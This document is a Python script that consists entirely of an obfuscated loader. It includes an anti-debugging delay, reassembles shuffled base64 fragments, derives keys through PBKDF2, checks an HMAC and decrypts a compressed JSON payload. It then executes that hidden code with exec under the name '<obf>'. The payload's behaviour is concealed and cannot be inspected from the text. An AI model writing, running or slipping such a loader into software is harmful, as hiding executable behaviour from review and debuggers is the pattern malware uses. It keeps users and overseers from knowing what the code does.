import base64, zlib, json, hashlib, hmac, sys, time
import sys, time
tracef = getattr(sys, 'gettrace', None)
if tracef and tracef():
    time.sleep(5)
_6898ba_0 = '1LtOo66PD9bV7fJPOlftNOG70tCB5pmSwyaB4ke'
_6898ba_1 = 'wM147dEfzYIwLkxHpq6ELqMAX5gWN'
_6898ba_2 = 'PJgF8UNLaudFace8xk6LaC2H0U'
_6898ba_3 = 'UHZlEOr/LvQHM5X+m5yl'
_6898ba_4 = 'o1DoxLsZhaQFuvU87x3CQzOAguS4Jt9hyymIC6+aeo7pZIw6eA'
_6898ba_5 = 'SHWtFrXltrJWVA0l60yrnviWmmpwrpv21owFwxQGdpMp1TYiQXrGr5Nzw'
_6898ba_6 = 'gWa9bpXz5gFIcMkpzjzxeQtNSvGtcGErg1FMcdPheUXqv'
_6898ba_7 = 'Y7xXv8SPkIavjWhvCTlNK2/mA8Q+3Nd8euX/4iKYUVu'
_6898ba_8 = '5FRWhZdfI3xHK4n61bRzdbExHYOSIgScG6rH66lxvCnYM5gJ'
_6898ba_9 = 'ptXC8TNN9tqkowHtEzddHngO6EoJQ7XxHwOcdpwSWXk5fHnrpPMtW/5SzQIIa9X'
_6898ba_10 = 'g8TGR9Jw4bEDbt55sUqS5jWNHH/HOD7v6JVcPYGzW0W3LOmIxMh7whMX'
_6898ba_11 = 'lLb0JG/x4pGbjk4xu/JVD6lUaqCFCG6+E2uRFuiH3viECPEb'
_6898ba_12 = 'iYEdjmaSvjshg39WxAWfJBzYId5'
_6898ba_13 = '+8gvm+ylOqJWRdV843T7wzU1GbfMaKPhdOnZYlh'
_6898ba_14 = 'tCzUAHk+mfnm4UsMAWgD5J'
_6898ba_15 = '5n/svGYGl+2teJScpcvcmMv+11AiZPXXI4RHU2cPA'
_6898ba_16 = 'TFxunEwA/1RTY0A9EQXp/jZcZFm'
_6898ba_17 = '+SIpZLbHDEP2tmKu3oqyYy4R3DGG4X500amD2teSIM10bkHBTsLAc84'
_6898ba_18 = 'xvF+HH9nfJeMvwVSNbECqpKsjSmvAb3z5oBiladN2U0WEr'
_6898ba_19 = 'm6SU0jJfY64aUbS/fWDcOqQwab41pF77nCGJpVQSe0m8U7WZPK2Bq1Nd'
_6898ba_20 = 'vNsyIchB8Lu52WbNe+2jcuAXJsRA5axpSNJ8S6w4s/XHJdz275Qf'
_6898ba_21 = 'aRZZvclOOpCHUWNLxgplH6cy'
_6898ba_22 = 'WR2Woq43ntxuyqReCFZ+0/uPrhBTy1ag9EAPYlYGMbfqOXzerSxwOhPHypR'
_6898ba_23 = '5wTfJNJd7GKXMiZbSdqX'
_6898ba_24 = 'SjIz7NKFE4IDuCRUsj9HaJEOEwDLJjbVMfvcTrOI/2DR'
_6898ba_25 = '76AlPiEXxJ0TPYrB1TzBnXl/FdNvagUaHlZ9vA=='
_6898ba_26 = '5/p1bEEMbJWgQSM3RvWBYPJyZswYxgFhWYWV5R30fZZM/UfxzflljfirDg'
_6898ba_27 = 'Ris9qldAsUxbkHmMVyEZrYXezQ7EF0pDnpYHZRaav1v7S59kcupEl2D'
_6898ba_28 = 'dVR++YyXhGLunnfz9nDr'
_6898ba_29 = 'B82H7QRKyOGcuIbviRW78+5WE3P+La'
_6898ba_30 = 'w643CPQ5MpalrHubtCj/dIQcv'
_6898ba_31 = '5/yMgeoS8oLPv/DXf61enJUHp9S'
_6898ba_32 = 'hQHSDcoYriMIQy/hqMOC/KX5dFXdfuDn0ga+02E5D'
_6898ba_33 = '0uljCDGHO5rNZ2+xoBQZiCbxzf8hLVR9vf+hjIo'
_6898ba_34 = 'lp/AZUzFsJgcvjaH1ue0VsSrKBfvAzT0D'
_pls = [_6898ba_0, _6898ba_1, _6898ba_2, _6898ba_3, _6898ba_4, _6898ba_5, _6898ba_6, _6898ba_7, _6898ba_8, _6898ba_9, _6898ba_10, _6898ba_11, _6898ba_12, _6898ba_13, _6898ba_14, _6898ba_15, _6898ba_16, _6898ba_17, _6898ba_18, _6898ba_19, _6898ba_20, _6898ba_21, _6898ba_22, _6898ba_23, _6898ba_24, _6898ba_25, _6898ba_26, _6898ba_27, _6898ba_28, _6898ba_29, _6898ba_30, _6898ba_31, _6898ba_32, _6898ba_33, _6898ba_34]
_210c52 = [(35846,30552,2),(43029,802,2),(6809,6324,2),(39114,12740,2),(42050,27964,2),(16924,62216,2),(991,24645,2),(61564,40301,2),(4217,21044,2),(63882,17707,2),(18199,3659,2),(37709,64568,2),(1035,47090,2),(10021,15994,2),(324,60815,2),(6477,18395,2),(0,0,0),(0,0,0)]
_04d1b0 = '+16rNw=='
_d1ae65 = '22Lcus0Ap0ep0jAe'
_1f4c99 = 'GrDL6EnRp+Q='
_98f35e = [27, 25, 9, 31, 1, 2, 19, 11, 22, 17, 23, 13, 10, 33, 16, 8, 21, 20, 14, 26, 32, 3, 29, 24, 0, 34, 12, 7, 6, 15, 4, 5, 18, 30, 28]
_salt = base64.b64decode(_1f4c99)
mhash = hashlib.sha256((__name__ + '|' + repr(globals().get('__file__',''))).encode('utf-8') + _salt).digest()
rbytes = list(mhash)
_perm = list(range(len(_pls)))
for _i in range(len(_perm)-1, 0, -1):
    _j = (rbytes[_i % len(rbytes)] + _i) % (_i + 1)
    _perm[_i], _perm[_j] = _perm[_j], _perm[_i]
_idxs = _98f35e
_assembled_list = []
_npls = len(_pls)
for _i in range(_npls):
    _pos = None
    try:
        _pos = _idxs.index(_i)
    except Exception:
        _pos = None
    if _pos is not None:
        _assembled_list.append(_pls[_pos])
_assembled = ''.join(_assembled_list)
_a7f12f = base64.b64decode(_assembled)
_945142 = 32
_e6c943 = _a7f12f[:-_945142]
_945142 = _a7f12f[-_945142:]
_ee82e8 = (lambda P: b''.join(((v ^ m).to_bytes(l, 'big') for (v,m,l) in P if l)))(_210c52)
_hdr = base64.b64decode(_04d1b0)
_nonce = base64.b64decode(_d1ae65)
_km_seed = hashlib.sha256(_ee82e8 + _hdr + _nonce).digest()
_km = hashlib.pbkdf2_hmac('sha256', _km_seed, _nonce, 100000, dklen=32)
_blob_seed = hashlib.sha256(_km + b'blob').digest()
_blob_k = hashlib.pbkdf2_hmac('sha256', _blob_seed, _nonce, 20000, dklen=32)
_calc_tag = hmac.new(_blob_k, _e6c943, hashlib.sha256).digest()
if _calc_tag != _945142:
    raise RuntimeError('integrity check failed')
_bs = b''
_ctr = 0
_need = len(_e6c943)
while len(_bs) < _need:
    _bs += hashlib.sha256(_blob_k + _ctr.to_bytes(4, 'little')).digest()
    _ctr += 1
_raw = bytes(a ^ b for a, b in zip(_e6c943, _bs[:_need]))
_dec = zlib.decompress(_raw).decode('utf-8')
_J = json.loads(_dec)
mmap = {}
for _i, _enc in enumerate(_J['strs']):
    _c = base64.b64decode(_enc)
    _seed = hashlib.sha256(_km + b'str' + _i.to_bytes(4, 'little')).digest()
    _ks = b''
    _ctr = 0
    _need = len(_c)
    while len(_ks) < _need:
        _ks += hashlib.sha256(_seed + _ctr.to_bytes(4, 'little')).digest()
        _ctr += 1
    _pt = bytes(a ^ b for a, b in zip(_c, _ks[:_need]))
    mmap[str(_i)] = _pt.decode('utf-8')
globals()['_508acd'] = mmap
globals()['_20ed41'] = lambda i: globals()['_508acd'][str(i)]
_x = globals()['_20ed41']
exec(compile(_J['s'], '<obf>', 'exec'), globals())
